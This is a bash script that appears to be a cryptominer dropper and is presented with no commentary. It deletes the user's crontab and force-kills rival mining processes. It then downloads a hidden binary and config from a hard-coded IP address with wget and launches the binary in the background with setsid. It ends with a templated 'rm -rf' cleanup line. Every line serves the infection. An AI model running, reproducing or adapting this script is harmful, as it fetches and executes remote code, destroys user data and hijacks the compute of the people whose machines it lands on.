#!/bin/bash

crontab -r
cd ~

(ps auxf | grep -v grep | grep -a kworker34 |awk '{print $2}'|xargs kill -9)
(ps auxf | grep -v grep | grep -a .daemond |awk '{print $2}'|xargs kill -9)
(ps auxf | grep -v grep | grep -a cryptonight |awk '{print $2}'|xargs kill -9)
(ps auxf | grep -v grep | grep -a 91.235.143.237 |awk '{print $2}'|xargs kill -9)

if [ -f .daemond ]; then
  rm -rf .daemond
  rm -rf .conf
fi

cat /proc/cpuinfo|grep aes>/dev/null
if [ $? -ne 1 ]; then
/usr/bin/wget http://198.211.121.75/.serviced -q -O .daemond
else
/usr/bin/wget http://198.211.121.75/.daemond -q
fi

/usr/bin/wget http://198.211.121.75/.conf -q

if [ -f .daemond ]; then
  chmod +x .daemond
  setsid ./.daemond  -c .conf > /dev/null 2>&1 &
fi

rm -rf {0}

